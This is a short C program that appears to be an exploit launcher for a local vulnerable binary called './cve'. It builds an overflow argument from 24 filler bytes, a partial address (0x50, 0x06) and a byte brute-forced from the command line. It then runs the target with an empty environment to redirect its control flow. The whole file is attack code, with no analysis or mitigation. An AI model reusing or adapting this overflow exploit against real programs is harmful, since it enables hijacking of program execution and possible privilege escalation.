#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
    if (argc < 2) {
        puts("You need to provide magic number");
        exit(1);
    }

    if (strlen(argv[1]) < 2) {
            puts("You looking for 2 digits number.");
            return 1;
    }

    char magic_number[3] = { argv[1][0], argv[1][1], '\0' };

    char magic_byte = (char) atoi(magic_number);

    printf("Your magic number is: %d\n", magic_byte);


    char addr[28]  = { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0x50, 0x06, magic_byte, 0 };
    char *newenviron[] = { NULL };

    char *cve_argv[] = { "cve", addr, NULL };

    execve("./cve", cve_argv, newenviron);
}
